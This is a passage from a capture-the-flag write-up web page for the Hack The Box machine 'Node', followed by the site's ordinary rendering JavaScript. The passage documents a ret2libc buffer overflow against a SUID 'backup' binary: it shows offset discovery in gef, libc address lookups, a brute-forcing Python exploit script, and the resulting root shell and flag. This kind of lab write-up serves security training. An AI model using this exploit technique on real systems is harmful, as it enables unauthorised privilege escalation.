+<p>Next we need to find the point where the program craches. Start by creating a random length payload: gef➤ pattern create 550 [+] Generating a pattern of 550 bytes aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafma</p>
+<p>Execute the program with the payload: gef➤ r dennis 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafma — snip — $ebp : 0x66616163 (“caaf”?) — snip — ────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ──── 0xffffc100│+0x0000: 0xffffd4b0 → “aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaama[…]” ← $esp — snip — ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: “backup”, stopped 0x616164 in ?? (), reason: SIGSEGV</p>
+<p>From the output ebp indicates where the program crached. We can quickly look up exactly where value “caaf” is: gef➤ pattern offset caaf [+] Searching ‘caaf’ [+] Found at offset 220 (little-endian search) likely [+] Found at offset 508 (big-endian search)</p>
+<p>The offset is said to be 508. We can prove this by creating a new pattern of 508, followed by 4 specified characters and verify that they are set as esp value.</p>
+<p>gef➤ pattern create 508 [+] Generating a pattern of 508 bytes aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaa</p>
+<p>gef➤ r dennis 45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474 aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafBBBB — snip — 0xffffbf84│+0x0000: “BBBB” ← $esp — snip — ──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ──── [#0] Id 1, Name: “backup”, stopped 0xf7e5dd9d in ?? (), reason: SIGSEGV</p>
+<p>It’s verified, the offset (or buffer size) is 508 byte.</p>
+<ol start="3" type="1">
+<li>Next, find all addresses needed to form an exploit.</li>
+</ol>
+<p>List libraries loaded within the binary using “ldd”:</p>
+<p>tom@node:/usr/local/bin$ ldd backup linux-gate.so.1 =&gt; (0xf7717000) libc.so.6 =&gt; /lib32/libc.so.6 (0xf7558000) /lib/ld-linux.so.2 (0xf7718000)</p>
+<p>Libc address: 0xf7558000</p>
+<p>Next, search for the system address within libc.so.6 using “readelf”: tom@node:/dev/shm$ readelf -s /lib32/libc.so.6 | grep system readelf -s /lib32/libc.so.6 | grep system 245: 00110820 68 FUNC GLOBAL DEFAULT 13 svcerr_systemerr@<span class="citation" data-cites="GLIBC_2.0">@GLIBC_2.0</span> 627: 0003a940 55 FUNC GLOBAL DEFAULT 13 __libc_system@<span class="citation" data-cites="GLIBC_PRIVATE">@GLIBC_PRIVATE</span> 1457: 0003a940 55 FUNC WEAK DEFAULT 13 system@<span class="citation" data-cites="GLIBC_2.0">@GLIBC_2.0</span></p>
+<p>System address: 0003a940</p>
+<p>Search to see if there’s an exit instruction: tom@node:/dev/shm$ readelf -s /lib32/libc.so.6 | grep exit 112: 0002eba0 39 FUNC GLOBAL DEFAULT 13 __cxa_at_quick_exit@<span class="citation" data-cites="GLIBC_2.10">@GLIBC_2.10</span> 141: 0002e7b0 31 FUNC GLOBAL DEFAULT 13 exit@<span class="citation" data-cites="GLIBC_2.0">@GLIBC_2.0</span> 450: 0002ebd0 181 FUNC GLOBAL DEFAULT 13 __cxa_thread_atexit_impl@<span class="citation" data-cites="GLIBC_2.18">@GLIBC_2.18</span> 558: 000af578 24 FUNC GLOBAL DEFAULT 13 _exit@<span class="citation" data-cites="GLIBC_2.0">@GLIBC_2.0</span> 616: 00113840 56 FUNC GLOBAL DEFAULT 13 svc_exit@<span class="citation" data-cites="GLIBC_2.0">@GLIBC_2.0</span> 652: 0002eb80 31 FUNC GLOBAL DEFAULT 13 quick_exit@<span class="citation" data-cites="GLIBC_2.10">@GLIBC_2.10</span> 876: 0002e9d0 85 FUNC GLOBAL DEFAULT 13 __cxa_atexit@<span class="citation" data-cites="GLIBC_2.1.3">@GLIBC_2.1.3</span> 1046: 0011d290 52 FUNC GLOBAL DEFAULT 13 atexit@GLIBC_2.0 1394: 001b0204 4 OBJECT GLOBAL DEFAULT 32 argp_err_exit_status@<span class="citation" data-cites="GLIBC_2.1">@GLIBC_2.1</span> 1506: 000f19a0 58 FUNC GLOBAL DEFAULT 13 pthread_exit@<span class="citation" data-cites="GLIBC_2.0">@GLIBC_2.0</span> 2108: 001b0154 4 OBJECT GLOBAL DEFAULT 32 obstack_exit_failure@<span class="citation" data-cites="GLIBC_2.0">@GLIBC_2.0</span> 2263: 0002e7d0 78 FUNC WEAK DEFAULT 13 on_exit@<span class="citation" data-cites="GLIBC_2.0">@GLIBC_2.0</span> 2406: 000f2db0 2 FUNC GLOBAL DEFAULT 13 __cyg_profile_func_exit@<span class="citation" data-cites="GLIBC_2.2">@GLIBC_2.2</span></p>
+<p>Exit address: 0002e7b0</p>
+<p>Next we need to find any instruction for executing a command, like “bash,sh etc…”, we do this using strings: tom@node:/dev/shm$ strings -tx /lib32/libc.so.6 | grep “/bin” 15900b /bin/sh 15ab8c /bin/csh 15bf70 /etc/bindresvport.blacklist 15e84c /bin:/usr/bin</p>
+<p>/bin/sh address: 15900b</p>
+<ol start="4" type="1">
+<li>Download a skelleton exploit and import our variables. [root:/git/htb/node]# cat bof.py (master✱) import struct, subprocess</li>
+</ol>
+<p>#bufferSize = 508 # gdb -&gt; pattern create/offset libc_base_addr = 0xf7558000 # ldd /usr/local/bin/backup system_off = 0x0003a940 # readelf -s /lib32/libc.so.6 | grep system exit_off = 0x0002e7b0 # readelf -s /lib32/libc.so.6 | grep exit system_addr = libc_base_addr + system_off exit_addr = libc_base_addr + exit_off binSh = libc_base_addr + 0x15900b # strings -tx /lib32/libc.so.6 | grep “/bin”</p>
+<p>buf = “A” * 512 buf += struct.pack(‘&lt;I’, system_addr) buf += struct.pack(‘&lt;I’, exit_addr) buf += struct.pack(‘&lt;I’, binSh)</p>
+<p>i = 0</p>
+<p>while True: i += 1 print ” &gt;&gt; BRUTE ATTEMPT: #%d” %i call = subprocess.call([“/usr/local/bin/backup”, “p3”, “45fac180e9eee72f4fd2d9386ea7033e52b7c740afc3d98a8d0230167104d474”, buf]) if (not call): break else: print ” &gt;&gt; Failed”</p>
+<p>tom@node:/dev/shm$ python bof.py — snip — &gt;&gt; BRUTE ATTEMPT: #15 — snip — # id uid=0(root) gid=1000(tom) groups=1000(tom),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),115(lpadmin),116(sambashare),1002(admin) # cat /root/root.txt 1722e99ca5f353b362556a62bd5e6be0</p>
+<p>██████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████████</p>
+<p>██╗███╗ ██╗███████╗ ██████╗ ██████╗ ███╗ ███╗ █████╗ ████████╗██╗ ██████╗ ███╗ ██╗ ██║████╗ ██║██╔════╝██╔═══██╗██╔══██╗████╗ ████║██╔══██╗╚══██╔══╝██║██╔═══██╗████╗ ██║ ██║██╔██╗ ██║█████╗ ██║ ██║██████╔╝██╔████╔██║███████║ ██║ ██║██║ ██║██╔██╗ ██║ ██║██║╚██╗██║██╔══╝ ██║ ██║██╔══██╗██║╚██╔╝██║██╔══██║ ██║ ██║██║ ██║██║╚██╗██║ ██║██║ ╚████║██║ ╚██████╔╝██║ ██║██║ ╚═╝ ██║██║ ██║ ██║ ██║╚██████╔╝██║ ╚████║ ╚═╝╚═╝ ╚═══╝╚═╝ ╚═════╝ ╚═╝ ╚═╝╚═╝ ╚═╝╚═╝ ╚═╝ ╚═╝ ╚═╝ ╚═════╝ ╚═╝ ╚═══╝</p>
+<p>MongoDB Insert Document: https://www.tutorialspoint.com/mongodb/mongodb_insert_document.htm https://www.bookstack.cn/read/mongodb-4.2-manual/c886d0f31f1fef7d.md</p>
+<p>BOF 32 bit: https://bufferoverflows.net/rop-manual-exploitation-on-x32-linux/</p>
+
+
+
+</main> <!-- /main -->
+<script id="quarto-html-after-body" type="application/javascript">
+window.document.addEventListener("DOMContentLoaded", function (event) {
+  const toggleBodyColorMode = (bsSheetEl) => {
+    const mode = bsSheetEl.getAttribute("data-mode");
+    const bodyEl = window.document.querySelector("body");
+    if (mode === "dark") {
+      bodyEl.classList.add("quarto-dark");
+      bodyEl.classList.remove("quarto-light");
+    } else {
+      bodyEl.classList.add("quarto-light");
+      bodyEl.classList.remove("quarto-dark");
+    }
+  }
+  const toggleBodyColorPrimary = () => {
+    const bsSheetEl = window.document.querySelector("link#quarto-bootstrap");
+    if (bsSheetEl) {
+      toggleBodyColorMode(bsSheetEl);
+    }
+  }
+  toggleBodyColorPrimary();  
+  const icon = "";
+  const anchorJS = new window.AnchorJS();
+  anchorJS.options = {
+    placement: 'right',
+    icon: icon
+  };
+  anchorJS.add('.anchored');
+  const isCodeAnnotation = (el) => {
+    for (const clz of el.classList) {
+      if (clz.startsWith('code-annotation-')) {                     
+        return true;
+      }
+    }
+    return false;
+  }
+  const onCopySuccess = function(e) {
+    // button target
+    const button = e.trigger;
+    // don't keep focus
+    button.blur();
+    // flash "checked"
+    button.classList.add('code-copy-button-checked');
+    var currentTitle = button.getAttribute("title");
+    button.setAttribute("title", "Copied!");
+    let tooltip;
+    if (window.bootstrap) {
+      button.setAttribute("data-bs-toggle", "tooltip");
+      button.setAttribute("data-bs-placement", "left");
+      button.setAttribute("data-bs-title", "Copied!");
+      tooltip = new bootstrap.Tooltip(button, 
+        { trigger: "manual", 
+          customClass: "code-copy-button-tooltip",
+          offset: [0, -8]});
+      tooltip.show();    
+    }
+    setTimeout(function() {
+      if (tooltip) {
+        tooltip.hide();
+        button.removeAttribute("data-bs-title");
+        button.removeAttribute("data-bs-toggle");
+        button.removeAttribute("data-bs-placement");
+      }
+      button.setAttribute("title", currentTitle);
+      button.classList.remove('code-copy-button-checked');
+    }, 1000);
+    // clear code selection
+    e.clearSelection();
+  }
+  const getTextToCopy = function(trigger) {
+      const codeEl = trigger.previousElementSibling.cloneNode(true);
+      for (const childEl of codeEl.children) {
+        if (isCodeAnnotation(childEl)) {
+          childEl.remove();
+        }
+      }
+      return codeEl.innerText;
+  }
+  const clipboard = new window.ClipboardJS('.code-copy-button:not([data-in-quarto-modal])', {
+    text: getTextToCopy
+  });
+  clipboard.on('success', onCopySuccess);
+  if (window.document.getElementById('quarto-embedded-source-code-modal')) {
+    // For code content inside modals, clipBoardJS needs to be initialized with a container option
+    // TODO: Check when it could be a function (https://github.com/zenorocha/clipboard.js/issues/860)
+    const clipboardModal = new window.ClipboardJS('.code-copy-button[data-in-quarto-modal]', {
+      text: getTextToCopy,
+      container: window.document.getElementById('quarto-embedded-source-code-modal')
+    });
+    clipboardModal.on('success', onCopySuccess);
+  }
+    var localhostRegex = new RegExp(/^(?:http|https):\/\/localhost\:?[0-9]*\//);
+    var mailtoRegex = new RegExp(/^mailto:/);
+      var filterRegex = new RegExp("https:\/\/exploit\.se");
+    var isInternal = (href) => {
+        return filterRegex.test(href) || localhostRegex.test(href) || mailtoRegex.test(href);
+    }
+    // Inspect non-navigation links and adorn them if external
+ 	var links = window.document.querySelectorAll('a[href]:not(.nav-link):not(.navbar-brand):not(.toc-action):not(.sidebar-link):not(.sidebar-item-toggle):not(.pagination-link):not(.no-external):not([aria-hidden]):not(.dropdown-item):not(.quarto-navigation-tool):not(.about-link)');
+    for (var i=0; i<links.length; i++) {
+      const link = links[i];
+      if (!isInternal(link.href)) {
+        // undo the damage that might have been done by quarto-nav.js in the case of
+        // links that we want to consider external
+        if (link.dataset.originalHref !== undefined) {
+          link.href = link.dataset.originalHref;
+        }
+      }
+    }
+  function tippyHover(el, contentFn, onTriggerFn, onUntriggerFn) {
+    const config = {
+      allowHTML: true,
+      maxWidth: 500,
+      delay: 100,
+      arrow: false,
+      appendTo: function(el) {
+          return el.parentElement;
+      },
+      interactive: true,
+      interactiveBorder: 10,
+      theme: 'quarto',
+      placement: 'bottom-start',
+    };
+    if (contentFn) {
+      config.content = contentFn;
+    }
+    if (onTriggerFn) {
+      config.onTrigger = onTriggerFn;
+    }
+    if (onUntriggerFn) {
+      config.onUntrigger = onUntriggerFn;
+    }
+    window.tippy(el, config); 
+  }
+  const noterefs = window.document.querySelectorAll('a[role="doc-noteref"]');
+  for (var i=0; i<noterefs.length; i++) {
+    const ref = noterefs[i];
+    tippyHover(ref, function() {
+      // use id or data attribute instead here
+      let href = ref.getAttribute('data-footnote-href') || ref.getAttribute('href');
+      try { href = new URL(href).hash; } catch {}
+      const id = href.replace(/^#\/?/, "");
+      const note = window.document.getElementById(id);
+      if (note) {
+        return note.innerHTML;
+      } else {
+        return "";
+      }
+    });
+  }
+  const xrefs = window.document.querySelectorAll('a.quarto-xref');
+  const processXRef = (id, note) => {
+    // Strip column container classes
+    const stripColumnClz = (el) => {
+      el.classList.remove("page-full", "page-columns");
+      if (el.children) {
+        for (const child of el.children) {
+          stripColumnClz(child);
+        }
+      }
+    }
+    stripColumnClz(note)
+    if (id === null || id.startsWith('sec-')) {
+      // Special case sections, only their first couple elements
+      const container = document.createElement("div");
+      if (note.children && note.children.length > 2) {
+        container.appendChild(note.children[0].cloneNode(true));
+        for (let i = 1; i < note.children.length; i++) {
+          const child = note.children[i];
+          if (child.tagName === "P" && child.innerText === "") {
+            continue;
+          } else {
+            container.appendChild(child.cloneNode(true));
+            break;
+          }
+        }
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(container);
+        }
+        return container.innerHTML
+      } else {
+        if (window.Quarto?.typesetMath) {
+          window.Quarto.typesetMath(note);
+        }
+        return note.innerHTML;
+      }
+    } else {
+      // Remove any anchor links if they are present
+      const anchorLink = note.querySelector('a.anchorjs-link');
+      if (anchorLink) {
+        anchorLink.remove();
+      }
+      if (window.Quarto?.typesetMath) {
+        window.Quarto.typesetMath(note);
+      }
+      // TODO in 1.5, we should make sure this works without a callout special case
+      if (note.classList.contains("callout")) {
+        return note.outerHTML;
+      } else {
+        return note.innerHTML;
+      }
+    }
+  }
+  for (var i=0; i<xrefs.length; i++) {
+    const xref = xrefs[i];
+    tippyHover(xref, undefined, function(instance) {
+      instance.disable();
+      let url = xref.getAttribute('href');
+      let hash = undefined; 
+      if (url.startsWith('#')) {
+        hash = url;
+      } else {
+        try { hash = new URL(url).hash; } catch {}
+      }
+      if (hash) {
+        const id = hash.replace(/^#\/?/, "");
+        const note = window.document.getElementById(id);
+        if (note !== null) {
+          try {
+            const html = processXRef(id, note.cloneNode(true));
+            instance.setContent(html);
+          } finally {
+            instance.enable();
+            instance.show();
+          }
+        } else {
+          // See if we can fetch this
+          fetch(url.split('#')[0])
+          .then(res => res.text())
+          .then(html => {
+            const parser = new DOMParser();
+            const htmlDoc = parser.parseFromString(html, "text/html");
+            const note = htmlDoc.getElementById(id);
+            if (note !== null) {
+              const html = processXRef(id, note);
+              instance.setContent(html);
+            } 
+          }).finally(() => {
+            instance.enable();
+            instance.show();
+          });
+        }
+      } else {
+        // See if we can fetch a full url (with no hash to target)
+        // This is a special case and we should probably do some content thinning / targeting
+        fetch(url)
+        .then(res => res.text())
+        .then(html => {
+          const parser = new DOMParser();
+          const htmlDoc = parser.parseFromString(html, "text/html");
+          const note = htmlDoc.querySelector('main.content');
+          if (note !== null) {
+            // This should only happen for chapter cross references
+            // (since there is no id in the URL)
+            // remove the first header
+            if (note.children.length > 0 && note.children[0].tagName === "HEADER") {
+              note.children[0].remove();
+            }
+            const html = processXRef(null, note);
+            instance.setContent(html);
+          } 
+        }).finally(() => {
+          instance.enable();
+          instance.show();
+        });
+      }
+    }, function(instance) {
+    });
+  }
+      let selectedAnnoteEl;
+      const selectorForAnnotation = ( cell, annotation) => {
+        let cellAttr = 'data-code-cell="' + cell + '"';
+        let lineAttr = 'data-code-annotation="' +  annotation + '"';
+        const selector = 'span[' + cellAttr + '][' + lineAttr + ']';
+        return selector;
+      }
+      const selectCodeLines = (annoteEl) => {
+        const doc = window.document;
+        const targetCell = annoteEl.getAttribute("data-target-cell");
+        const targetAnnotation = annoteEl.getAttribute("data-target-annotation");
+        const annoteSpan = window.document.querySelector(selectorForAnnotation(targetCell, targetAnnotation));
+        const lines = annoteSpan.getAttribute("data-code-lines").split(",");
+        const lineIds = lines.map((line) => {
+          return targetCell + "-" + line;
+        })
+        let top = null;
+        let height = null;
+        let parent = null;
+        if (lineIds.length > 0) {
+            //compute the position of the single el (top and bottom and make a div)
+            const el = window.document.getElementById(lineIds[0]);
+            top = el.offsetTop;
+            height = el.offsetHeight;
+            parent = el.parentElement.parentElement;
+          if (lineIds.length > 1) {
+            const lastEl = window.document.getElementById(lineIds[lineIds.length - 1]);
+            const bottom = lastEl.offsetTop + lastEl.offsetHeight;
+            height = bottom - top;
+          }
+          if (top !== null && height !== null && parent !== null) {
+            // cook up a div (if necessary) and position it 
+            let div = window.document.getElementById("code-annotation-line-highlight");
+            if (div === null) {
+              div = window.document.createElement("div");
+              div.setAttribute("id", "code-annotation-line-highlight");
+              div.style.position = 'absolute';
+              parent.appendChild(div);
+            }
+            div.style.top = top - 2 + "px";
+            div.style.height = height + 4 + "px";
+            div.style.left = 0;
+            let gutterDiv = window.document.getElementById("code-annotation-line-highlight-gutter");
+            if (gutterDiv === null) {
+              gutterDiv = window.document.createElement("div");
+              gutterDiv.setAttribute("id", "code-annotation-line-highlight-gutter");
+              gutterDiv.style.position = 'absolute';
+              const codeCell = window.document.getElementById(targetCell);
+              const gutter = codeCell.querySelector('.code-annotation-gutter');
+              gutter.appendChild(gutterDiv);
+            }
+            gutterDiv.style.top = top - 2 + "px";
+            gutterDiv.style.height = height + 4 + "px";
+          }
+          selectedAnnoteEl = annoteEl;
+        }
+      };
+      const unselectCodeLines = () => {
+        const elementsIds = ["code-annotation-line-highlight", "code-annotation-line-highlight-gutter"];
+        elementsIds.forEach((elId) => {
+          const div = window.document.getElementById(elId);
+          if (div) {
+            div.remove();
+          }
+        });
+        selectedAnnoteEl = undefined;
+      };
+        // Handle positioning of the toggle
+    window.addEventListener(
+      "resize",
+      throttle(() => {
+        elRect = undefined;
+        if (selectedAnnoteEl) {
+          selectCodeLines(selectedAnnoteEl);
+        }
+      }, 10)
+    );
+    function throttle(fn, ms) {
+    let throttle = false;
+    let timer;
+      return (...args) => {
+        if(!throttle) { // first call gets through
+            fn.apply(this, args);
+            throttle = true;
+        } else { // all the others get throttled
+            if(timer) clearTimeout(timer); // cancel #2
+            timer = setTimeout(() => {
+              fn.apply(this, args);
+              timer = throttle = false;
+            }, ms);
+        }
+      };
+    }
+      // Attach click handler to the DT
+      const annoteDls = window.document.querySelectorAll('dt[data-target-cell]');
+      for (const annoteDlNode of annoteDls) {
+        annoteDlNode.addEventListener('click', (event) => {
+          const clickedEl = event.target;
+          if (clickedEl !== selectedAnnoteEl) {
+            unselectCodeLines();
+            const activeEl = window.document.querySelector('dt[data-target-cell].code-annotation-active');
+            if (activeEl) {
+              activeEl.classList.remove('code-annotation-active');
+            }
+            selectCodeLines(clickedEl);
+            clickedEl.classList.add('code-annotation-active');
+          } else {
+            // Unselect the line
+            unselectCodeLines();
+            clickedEl.classList.remove('code-annotation-active');
+          }
+        });
+      }
+  const findCites = (el) => {
+    const parentEl = el.parentElement;
+    if (parentEl) {
+      const cites = parentEl.dataset.cites;
+      if (cites) {
+        return {
+          el,
+          cites: cites.split(' ')
+        };
+      } else {
+        return findCites(el.parentElement)
+      }
+    } else {
+      return undefined;
+    }
+  };
+  var bibliorefs = window.document.querySelectorAll('a[role="doc-biblioref"]');
+  for (var i=0; i<bibliorefs.length; i++) {
+    const ref = bibliorefs[i];
+    const citeInfo = findCites(ref);
+    if (citeInfo) {
+      tippyHover(citeInfo.el, function() {
+        var popup = window.document.createElement('div');
+        citeInfo.cites.forEach(function(cite) {
+          var citeDiv = window.document.createElement('div');
+          citeDiv.classList.add('hanging-indent');
+          citeDiv.classList.add('csl-entry');
+          var biblioDiv = window.document.getElementById('ref-' + cite);
+          if (biblioDiv) {
+            citeDiv.innerHTML = biblioDiv.innerHTML;
+          }
+          popup.appendChild(citeDiv);
+        });
+        return popup.innerHTML;
+      });
+    }
+  }
+});
+</script>
+</div> <!-- /content -->
+
+
+
+
+</body></html>
